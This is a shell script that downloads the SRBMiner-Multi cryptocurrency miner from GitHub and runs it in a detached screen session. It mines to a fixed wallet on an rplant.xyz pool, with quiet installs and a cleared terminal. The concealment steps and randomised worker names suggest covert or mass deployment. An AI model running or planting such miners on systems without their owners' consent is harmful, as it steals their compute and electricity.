#!/bin/sh

WALLET=BXdTSzXJ11Vtw2npzfV9ufGoyVzEP8BhTr.Mi_chat86-$(echo $(shuf -i 1-9999 -n 1))

POOL=asia.rplant.xyz:17075 

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
cd SRBMiner-Multi-0-8-5
chmod +x SRBMiner-MULTI
screen -S Ngepets -dm ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool $POOL --wallet $WALLET --password vapers86 --cpu-threads 4 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 3 -randomx-1gb-pages
screen -ls
sleep 4
clear
cd ..
screen -ls
./timer.sh
